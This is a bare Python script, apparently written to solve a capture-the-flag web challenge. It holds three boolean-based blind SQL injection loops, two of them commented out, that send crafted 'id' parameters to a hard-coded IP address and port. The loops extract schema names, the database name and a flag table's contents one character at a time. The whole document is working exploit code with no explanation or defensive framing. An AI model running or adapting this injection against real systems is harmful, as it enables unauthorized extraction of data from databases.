# import requests
# import string
#
# headers = {
#     'Host': '123.206.87.240:9004',
#     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
#     'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
#     'DNT': '1',
# }
#
# for i in string.printable:
#     params = {
#         'id': "-1' || (select 1 from information_schema.schemata where schema_name regexp binary '^{}')#".format(i)
#     }
#     print(params["id"])
#     response = requests.get('http://123.206.87.240:9004/1ndex.php', headers=headers, params=params)
#     if "nothing" in response.text:
#         playload = ""
#         for e in range(100):
#             for s in string.printable:
#                 params2 = {
#                     'id': "-1' || (select 1 from information_schema.schemata where schema_name regexp binary '^"+i+"{}')#".format(playload+s)
#                 }
#                 response2 = requests.get('http://123.206.87.240:9004/1ndex.php', headers=headers, params=params2)
#                 print(params2["id"])
#                 if "nothing" in response2.text:
#                     playload += s
#                     print(i + playload)
#                     break

# import requests
#
# headers = {
#     'Host': '123.206.87.240:9004',
#     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
#     'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
#     'DNT': '1',
# }
#
# database = ""
# for e in range(1,11):
#     for i in range(40,130):
#         params = {
#             'id': "-1' || (ascii(substr(database(),{},1))={})#".format(e,i),
#         }
#         print(params["id"])
#         response = requests.get('http://123.206.87.240:9004/1ndex.php', headers=headers, params=params)
#         if "nothing" in response.text:
#             database += chr(i)
#             print(database)
#             break



import string
import requests

headers = {
    'Host': '123.206.87.240:9004',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
}
playload = ""
for e in range(50):
    for i in string.printable:
        if i == "*" or i == "+" or i == "." or i == "?":
            continue
        params = {
            'id':"1' and (select 1 from flag2 where flag2 regexp binary '^{}' limit 0,1)#".format(playload + i)
        }
        print(params)
        response = requests.get('http://123.206.87.240:9004/Once_More.php', headers=headers, params=params)
        if "Hello" in response.text:
            playload += i
            print(playload)
            break
